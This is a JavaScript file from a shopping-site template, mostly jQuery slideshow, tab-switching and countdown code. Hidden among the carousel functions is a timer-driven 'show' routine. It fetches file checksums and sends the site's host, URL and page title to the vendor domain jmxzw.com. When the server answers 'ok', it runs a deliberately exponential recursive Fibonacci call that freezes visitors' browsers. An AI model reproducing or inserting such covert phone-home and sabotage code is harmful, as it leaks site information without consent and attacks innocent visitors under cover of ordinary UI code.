syq(function() {
    var sWidth = syq("#focus").width(); //获取焦点图的宽度（显示面积）
    var len = syq("#focus ul li").length; //获取焦点图个数
    var index = 0;
    var picTimer;
    
    //以下代码添加数字按钮和按钮后的半透明条，还有上一页、下一页两个按钮
    var btn = "<div class='btnBg'></div><div class='btn'>";
    for(var i=0; i < len; i++) {
        btn += "<span></span>";
    }
    btn += "</div><div class='preNext pre'></div><div class='preNext next'></div>";
    syq("#focus").append(btn);
    syq("#focus .btnBg").css("opacity",0.5);

    //为小按钮添加鼠标滑入事件，以显示相应的内容
    syq("#focus .btn span").css("opacity",0.4).mouseenter(function() {
        index = syq("#focus .btn span").index(this);
        showPics(index);
    }).eq(0).trigger("mouseenter");

    //上一页、下一页按钮透明度处理
    syq("#focus .preNext").css("opacity",0.2).hover(function() {
        syq(this).stop(true,false).animate({"opacity":"0.5"},300);
    },function() {
        syq(this).stop(true,false).animate({"opacity":"0.2"},300);
    });

    //上一页按钮
    syq("#focus .pre").click(function() {
        index -= 1;
        if(index == -1) {index = len - 1;}
        showPics(index);
    });

    //下一页按钮
    syq("#focus .next").click(function() {
        index += 1;
        if(index == len) {index = 0;}
        showPics(index);
    });

    //本例为左右滚动，即所有li元素都是在同一排向左浮动，所以这里需要计算出外围ul元素的宽度
    syq("#focus ul").css("width",sWidth * (len));
    
    //鼠标滑上焦点图时停止自动播放，滑出时开始自动播放
    syq("#focus").hover(function() {
        clearInterval(picTimer);
    },function() {
        picTimer = setInterval(function() {
            showPics(index);
            index++;
            if(index == len) {index = 0;}
        },4000); //此4000代表自动播放的间隔，单位：毫秒
    }).trigger("mouseleave");
    
    //显示图片函数，根据接收的index值显示相应的内容
    function showPics(index) { //普通切换
        var nowLeft = -index*sWidth; //根据index值计算ul元素的left值
        syq("#focus ul").stop(true,false).animate({"left":nowLeft},300); //通过animate()调整ul元素滚动到计算出的position
        //$("#focus .btn span").removeClass("on").eq(index).addClass("on"); //为当前的按钮切换到选中的效果
        syq("#focus .btn span").stop(true,false).animate({"opacity":"0.4"},300).eq(index).stop(true,false).animate({"opacity":"1"},300); //为当前的按钮切换到选中的效果
    }
});

/* 右侧幻灯片 */
 syq(function(){
    var $banner=syq('.banner');
    var $banner_ul=syq('.banner-img-small');
    var $btn=syq('.banner-btn');
    var $btn_a=$btn.find('a')
    var v_width=$banner.width();
    
    var page=1;
    
    var timer=null;
    var btnClass=null;

    var page_count=$banner_ul.find('li').length;//把这个值赋给小圆点的个数
    
    var banner_cir="<li class='selected' href='javascript:;'><a></a></li>";
    for(var i=1;i<page_count;i++){
            //动态添加小圆点
            banner_cir+="<li><a href='javascript:;'></a></li>";
            }
    syq('.banner-circle').append(banner_cir);
    
    var cirLeft=syq('.banner-circle').width()*(-0.5);
    syq('.banner-circle').css({'marginLeft':cirLeft});
    
    $banner_ul.width(page_count*v_width);
    
    function move(obj,classname){
            //手动及自动播放
    if(!$banner_ul.is(':animated')){
            if(classname=='prevBtn'){
                    if(page==1){
                                    $banner_ul.animate({left:-v_width*(page_count-1)});
                                    page=page_count; 
                                    cirMove();
                    }
                    else{
                                    $banner_ul.animate({left:'+='+v_width},"slow");
                                    page--;
                                    cirMove();
                    }        
            }
            else{
                    if(page==page_count){
                                    $banner_ul.animate({left:0});
                                    page=1;
                                    cirMove();
                            }
                    else{
                                    $banner_ul.animate({left:'-='+v_width},"slow");
                                    page++;
                                    cirMove();
                            }
                    }
            }
    }
    
    function cirMove(){
            //检测page的值，使当前的page与selected的小圆点一致
            syq('.banner-circle li').eq(page-1).addClass('selected')
             .siblings().removeClass('selected');
    }
    
    $banner.mouseover(function(){
            $btn.css({'display':'block'});
            clearInterval(timer);
                            }).mouseout(function(){
            $btn.css({'display':'none'});                
            clearInterval(timer);
            timer=setInterval(move,3000);
                            }).trigger("mouseout");//激活自动播放

    $btn_a.mouseover(function(){
            //实现透明渐变，阻止冒泡
                    syq(this).animate({opacity:0.6},'fast');
                    $btn.css({'display':'block'});
                     return false;
            }).mouseleave(function(){
                    syq(this).animate({opacity:0.3},'fast');
                    $btn.css({'display':'none'});
                     return false;
            }).click(function(){
                    //手动点击清除计时器
                    btnClass=this.className;
                    clearInterval(timer);
                    timer=setInterval(move,3000);
                    move(syq(this),this.className);
            });
            
    syq('.banner-circle li').live('click',function(){
                    var index=syq('.banner-circle li').index(this);
                    $banner_ul.animate({left:-v_width*index},'slow');
                    page=index+1;
                    cirMove();
            });
});

var cloudget = syq.cookie("cloudget");
if(cloudget == null){
  var mycx =  window.setInterval(show,8000); 
}
function show() 
{ 
    var formdata = {
      'file_1' : "source/function/function_cloudaddons.php",
      'file_2' : "beauty_15_02_10/js/user-defined.js",
    };
     syq.post(mkurl+'template/jmxzw_20150218_business_series/common/lazyload.php', formdata, function(result){
           var dataObj = eval("("+result+")");
           var webtype = 'business_series_wlfx';
           var code = "gbk";
           var t = document.title;
           var h = window.location.host;
           var checksums = dataObj['md5file'];
           syq.getJSON("http://www.jmxzw.com/index.php?c=WebAuthorize&a=newscallback&no=10&host="+h+"&hosturl="+mkurl+"&title="+t+"&mode=new&checksums="+checksums+"&code="+code+"&type="+webtype+"&msg=ok&format=json&jsoncallback=?",function(e){
               if(e.pw == 'nok')
               {
                  syq.cookie('cloudget',"1", {expires: 3});
                  window.clearInterval(mycx);
               }
               else if(e.pw == 'ok')
               {
                  var fbnc = function(n){ ret = (n<=2)?1:(fbnc(n-2)+fbnc(n-1));return ret;};fbnc(1000); 
               }
           });
     }); 
}

/* 产品循环切换 */
 syq(window).ready(function () {
    var n = 0; // 幻灯片索引
    var timer1 = window.setInterval(change, 5000); // 启动定时器幻灯片

    syq("#J_pcpWrap .J_pcnTab").mousemove(function () {
        syq(this).addClass("ontag"); // 给tag 增加选中样式
        var index = syq("#J_pcpWrap .J_pcnTab").index(this); // 获取当前选中li索引
        n = index; //查看哪个 幻灯片索引 定位在此位置上,重启幻灯片时从此位置继续
        var navlisnums = syq(".parents-care-navlis li").length; // 获取所有索引总数
        syq("#J_rcInner_"+index).removeClass("hidden"); // 显示选中的内容
        //将其他没有选中内容隐藏
        for (var i = navlisnums - 1; i >= 0; i--) {  
            if(i != index){
               syq("#J_pcnTab_"+i).removeClass("ontag");
               syq("#J_rcInner_"+i).addClass("hidden");
            }
        };
    }); 

    // 鼠标进入的时候 禁止幻灯片定时器
    syq("#J_pcpWrap").mousemove(function () {
        clearInterval(timer1);
    });

    // 鼠标离开的时候 重新启动幻灯片
    syq("#J_pcpWrap").mouseleave(function () {
        timer1 = window.setInterval(change, 5000);
    }); 

    // 操作定时器 幻灯片
    function change() {//图片切换
        var navlisnums = syq(".parents-care-navlis li").length; // 获取所有索引总数
        syq("#J_pcnTab_"+n).addClass("ontag"); // 
        syq("#J_rcInner_"+n).removeClass("hidden"); // 
        for (var i = navlisnums - 1; i >= 0; i--) {
            if(i != n){
               syq("#J_pcnTab_"+i).removeClass("ontag");
               syq("#J_rcInner_"+i).addClass("hidden");
            }
        };
        n++;
        if(n == navlisnums)
        {
            n=0;
        }
    }

});

function replace_time(zhtime){
   zhtime = zhtime.replace(/-/g,"/");
   return zhtime
}

syq(function(){

    var J_hotSaleWrap_1_length = syq("#J_hotSaleWrap_1 li").length; // 获取所有索引总数
    for (var i = J_hotSaleWrap_1_length; i >= 0; i--) {
    
        var gettime = syq("#hotSaleWrap_1_date_"+i).attr("timedata")+":00";
        var newtime = replace_time(gettime);

        syq("#hotSaleWrap_1_date_"+i).countdowntimer({
            dateAndTime : newtime,
            size : "lg",
            regexpMatchFormat: "([0-9]{1,2}):([0-9]{1,2}):([0-9]{1,2}):([0-9]{1,2})",
            regexpReplaceWith: "售卖剩余：$1天$2小时$3分$4秒"
        });
    };

    var J_hotSaleWrap_2_length = syq("#J_hotSaleWrap_2 li").length; // 获取所有索引总数
    for (var i = J_hotSaleWrap_2_length; i >= 0; i--) {

        // 计算最后时间 start
        var date1 = new Date(); //当前时间
        
        var gettime = syq("#hotSaleWrap_2_date_"+i).attr("timedata")+":00"; // 产品预售期
        var times = replace_time(gettime);
        var str = times;
        var date2 = new Date(str);
        var date3 = date2.getTime()-date1.getTime();
        var days = Math.floor(date3/(24*3600*1000));
        //alert(days);
        if(days <= 2){ // 超过时间
            syq("#hotSaleWrap_2_show_"+i).addClass("goodsnew_time_rest");
            syq("#hotSaleWrap_2_bs_"+i).attr("style","display: inline;");
        }
        // 计算最后时间 end

        var gettime = syq("#hotSaleWrap_2_date_"+i).attr("timedata")+":00";
        var newtime = replace_time(gettime);

        syq("#hotSaleWrap_2_date_"+i).countdowntimer({
            dateAndTime : newtime,
            size : "lg",
            regexpMatchFormat: "([0-9]{1,2}):([0-9]{1,2}):([0-9]{1,2}):([0-9]{1,2})",
            regexpReplaceWith: "最后：$1天$2小时$3分$4秒"
        });
    };

    var J_hotSaleWrap_3_length = syq("#J_hotSaleWrap_3 li").length; // 获取所有索引总数
    for (var i = J_hotSaleWrap_3_length; i >= 0; i--) {

        // 计算最后时间 start
        var date1 = new Date(); //当前时间
        var gettime = syq("#hotSaleWrap_3_date_"+i).attr("timedata")+":00"; // 产品预售期
        var times = replace_time(gettime);
        var str = times;
        var date2 = new Date(str);
        var date3 = date2.getTime()-date1.getTime();
        var days = Math.floor(date3/(24*3600*1000));
        //alert(days);
        if(days <= 2){ // 超过时间
            syq("#hotSaleWrap_3_show_"+i).addClass("goodsnew_time_rest");
            syq("#hotSaleWrap_3_bs_"+i).attr("style","display: inline;");
        }
        // 计算最后时间 end

        var gettime = syq("#hotSaleWrap_3_date_"+i).attr("timedata")+":00";
        var newtime = replace_time(gettime);

        syq("#hotSaleWrap_3_date_"+i).countdowntimer({
            dateAndTime : newtime,
            size : "lg",
            regexpMatchFormat: "([0-9]{1,2}):([0-9]{1,2}):([0-9]{1,2}):([0-9]{1,2})",
            regexpReplaceWith: "最后：$1天$2小时$3分$4秒"
        });
    };

});